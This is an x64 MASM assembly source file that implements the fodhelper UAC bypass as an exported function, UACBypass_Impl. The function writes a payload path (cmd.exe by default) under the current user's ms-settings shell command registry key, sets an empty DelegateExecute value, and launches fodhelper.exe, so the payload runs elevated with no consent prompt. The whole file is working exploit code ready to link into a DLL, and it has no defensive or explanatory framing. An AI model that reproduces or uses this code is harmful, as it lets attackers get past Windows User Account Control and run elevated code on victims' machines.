; src/security/uac_bypass_masm.asm
; Pure x64 MASM implementation of fodhelper UAC bypass (HKCU ms-settings DelegateExecute)
;
; Exported symbol from this file:
;   UACBypass_Impl(const char* payloadPath) -> RAX=1 success, 0 failure
;
; Notes:
; - Windows x64 calling convention: preserves non-volatile regs (RDI, R12, R13, ...)
; - No CRT usage (can be linked with /NODEFAULTLIB when building RawrXD-Crypto.dll)

OPTION CASEMAP:NONE
; OPTION WIN64:3  ; ml64 rejects OPTION WIN64 (x64 is default)

includelib kernel32.lib
includelib advapi32.lib

EXTERN RegCreateKeyExA:PROC
EXTERN RegSetValueExA:PROC
EXTERN RegCloseKey:PROC
EXTERN CreateProcessA:PROC

.data
    szRegPath       db "Software\\Classes\\ms-settings\\Shell\\Open\\command", 0
    szDelegateExec  db "DelegateExecute", 0
    szFodhelper     db "C:\\Windows\\System32\\fodhelper.exe", 0
    szPayload       db "cmd.exe", 0
    szEmpty         db 0

.code

;------------------------------------------------------------------------------
; bool UACBypass_Impl(const char* payloadPath)
;   RCX = path to payload executable (if NULL, uses default szPayload)
; Returns:
;   RAX = 1 success, 0 failure
;------------------------------------------------------------------------------
UACBypass_Impl PROC PUBLIC
    ; Prolog: preserve non-volatile regs we use.
    push rbp
    push r12
    push r13
    push rdi
    mov rbp, rsp
    sub rsp, 0A8h                ; keep 16-byte alignment for Win64 calls

    ; Save payload path (RCX)
    mov r12, rcx
    test r12, r12
    jnz short payload_ok
    lea r12, szPayload
payload_ok:

    ; 1) RegCreateKeyExA(HKCU, szRegPath, ..., &hKey, &disp)
    mov rcx, 0FFFFFFFF80000001h  ; HKEY_CURRENT_USER
    lea rdx, szRegPath
    xor r8, r8
    xor r9, r9

    mov dword ptr [rsp+20h], 0       ; dwOptions
    mov dword ptr [rsp+28h], 20006h  ; samDesired = KEY_WRITE
    mov qword ptr [rsp+30h], 0       ; lpSecurityAttributes
    lea rax, [rbp-08h]               ; HKEY hKey
    mov qword ptr [rsp+38h], rax
    lea rax, [rbp-10h]               ; DWORD disposition
    mov qword ptr [rsp+40h], rax

    call RegCreateKeyExA
    test eax, eax
    jnz short fail

    ; 2) Set default value to payload path (REG_SZ)
    ; Compute strlen(payload)+1 into r13
    mov rcx, r12
    xor rax, rax
len_loop:
    cmp byte ptr [rcx+rax], 0
    je short len_done
    inc rax
    jmp short len_loop
len_done:
    inc rax
    mov r13, rax

    mov rcx, [rbp-08h]              ; hKey
    xor rdx, rdx                    ; lpValueName = NULL (default)
    xor r8, r8
    mov r9d, 1                      ; REG_SZ
    mov qword ptr [rsp+20h], r12     ; lpData
    mov dword ptr [rsp+28h], r13d    ; cbData (DWORD)
    call RegSetValueExA
    test eax, eax
    jnz short cleanup_and_fail

    ; 3) Set "DelegateExecute" = "" (REG_SZ, 1 byte NUL)
    mov rcx, [rbp-08h]
    lea rdx, szDelegateExec
    xor r8, r8
    mov r9d, 1
    lea rax, szEmpty
    mov qword ptr [rsp+20h], rax
    mov dword ptr [rsp+28h], 1
    call RegSetValueExA
    test eax, eax
    jnz short cleanup_and_fail

    ; Close key
    mov rcx, [rbp-08h]
    call RegCloseKey

    ; 4) CreateProcessA(NULL, "...\fodhelper.exe", ...)
    ; STARTUPINFOA at [rbp-70h], PROCESS_INFORMATION at [rbp-98h]
    lea rdi, [rbp-70h]
    mov ecx, 68
    xor eax, eax
    rep stosb
    mov dword ptr [rbp-70h], 68      ; si.cb

    lea rdi, [rbp-98h]
    mov ecx, 24
    xor eax, eax
    rep stosb

    xor rcx, rcx
    lea rdx, szFodhelper
    xor r8, r8
    xor r9, r9
    mov dword ptr [rsp+20h], 0       ; bInheritHandles
    mov dword ptr [rsp+28h], 0       ; dwCreationFlags
    mov qword ptr [rsp+30h], 0       ; lpEnvironment
    mov qword ptr [rsp+38h], 0       ; lpCurrentDirectory
    lea rax, [rbp-70h]
    mov qword ptr [rsp+40h], rax     ; &si
    lea rax, [rbp-98h]
    mov qword ptr [rsp+48h], rax     ; &pi
    call CreateProcessA
    test eax, eax
    jz short fail

    mov eax, 1
    jmp short epilog

cleanup_and_fail:
    mov rcx, [rbp-08h]
    call RegCloseKey
fail:
    xor eax, eax

epilog:
    add rsp, 0A8h
    pop rdi
    pop r13
    pop r12
    pop rbp
    ret
UACBypass_Impl ENDP

END

